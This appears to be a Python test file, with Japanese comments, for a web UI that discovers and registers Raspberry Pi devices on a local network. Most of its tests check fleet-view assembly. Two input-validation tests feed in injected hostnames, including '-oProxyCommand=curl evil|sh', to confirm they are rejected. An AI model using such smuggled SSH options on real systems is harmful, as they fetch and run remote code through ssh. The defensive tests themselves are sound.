"""画面へ渡すJSONの組み立ての検証。

HTTPの配線ではなく、組み立てロジック(純関数)を検証する。
"""
from fleet_ui.collect import ChildStatus
from fleet_ui.discovery import Neighbor
from fleet_ui.server import build_fleet_view, run_step


def _neigh():
    return [
        Neighbor("10.42.0.52", "2c:cf:67:c1:1d:7b", "REACHABLE"),
        Neighbor("10.42.0.194", "88:a2:9e:30:5e:46", "REACHABLE"),
    ]


def test_known_child_appears_with_mac_as_key():
    view = build_fleet_view(
        neighbors=_neigh(),
        inventory_ips={"zero2": "10.42.0.52"},
        statuses={"10.42.0.52": ChildStatus(ip="10.42.0.52", hostname="pizero2w")},
    )
    assert [c["mac"] for c in view["children"]] == ["2c:cf:67:c1:1d:7b"]
    assert view["children"][0]["hostname"] == "pizero2w"


def test_unlisted_device_is_offered_for_registration():
    view = build_fleet_view(
        neighbors=_neigh(), inventory_ips={"zero2": "10.42.0.52"}, statuses={},
    )
    assert [d["ip"] for d in view["candidates"]] == ["10.42.0.194"]


def test_suggested_hostname_is_included_for_registration():
    view = build_fleet_view(
        neighbors=_neigh(),
        inventory_ips={"zero2": "10.42.0.52"},
        statuses={"10.42.0.52": ChildStatus(ip="10.42.0.52", hostname="pizero2w")},
    )
    assert view["suggested_hostname"] == "pizero2w-2"


def test_duplicate_sta_no_is_reported():
    """重複は Oracle でレコードが無警告に欠落する事故に直結するので必ず出す。"""
    view = build_fleet_view(
        neighbors=_neigh(),
        inventory_ips={"a": "10.42.0.52", "b": "10.42.0.194"},
        statuses={
            "10.42.0.52": ChildStatus(ip="10.42.0.52", hostname="a",
                                      id_names={"1": ["H", "T", "1"]}),
            "10.42.0.194": ChildStatus(ip="10.42.0.194", hostname="b",
                                       id_names={"1": ["H", "T", "1"]}),
        },
    )
    assert view["duplicates"]


def test_registration_is_blocked_while_an_entry_is_unresolved():
    """稼働中の子がIPドリフトで unverified に現れうる間は登録させない。
    画面には理由を出す。"""
    view = build_fleet_view(
        neighbors=_neigh(),
        inventory_ips={"zero2": "10.42.0.52", "kodomo3": None},
        statuses={},
    )
    assert view["candidates"] == []
    assert "kodomo3" in view["blocked_reason"]


def test_blocked_reason_is_absent_when_everything_resolves():
    view = build_fleet_view(
        neighbors=_neigh(), inventory_ips={"zero2": "10.42.0.52"}, statuses={},
    )
    assert view["blocked_reason"] is None


def test_unresolved_entry_is_not_a_registration_candidate():
    """既存の子を新機と誤認すると、稼働中の機体を再プロビジョニングしかねない。"""
    view = build_fleet_view(
        neighbors=_neigh(),
        inventory_ips={"zero2": "10.42.0.52", "kodomo3": None},
        statuses={},
    )
    assert all(d["ip"] != "kodomo3" for d in view["candidates"])
    assert any(c["entry"] == "kodomo3" and c["kind"] == "unresolved"
               for c in view["children"])


# --- 入力検証 ---------------------------------------------------------------
# hostname は ssh-keyscan の argv と children.conf の中身になる。検証を rename
# だけに置くと、hostkey / inventory 工程から素通りする。

def test_hostkey_step_validates_the_hostname():
    """`-oProxyCommand=...` のような値が ssh-keyscan の argv に渡ると危険。"""
    res = run_step({"step": "hostkey", "ip": "10.42.0.9", "hostname": "-oProxyCommand=x"})
    assert res["ok"] is False


def test_inventory_step_validates_the_hostname():
    """改行を含む値を children.conf に書くと、以後 ssh の宛先として使われる。"""
    res = run_step({"step": "inventory", "ip": "10.42.0.9",
                    "hostname": "a\n-oProxyCommand=curl evil|sh"})
    assert res["ok"] is False


def test_rename_step_still_validates():
    res = run_step({"step": "rename", "ip": "10.42.0.9", "hostname": "BAD NAME"})
    assert res["ok"] is False


def test_steps_without_hostname_are_unaffected():
    """stop / blank / mdns は hostname を使わないので検証で弾かれない。"""
    res = run_step({"step": "unknown-step", "ip": "10.42.0.9"})
    assert res["ok"] is False
    assert "不明な工程" in res["message"]
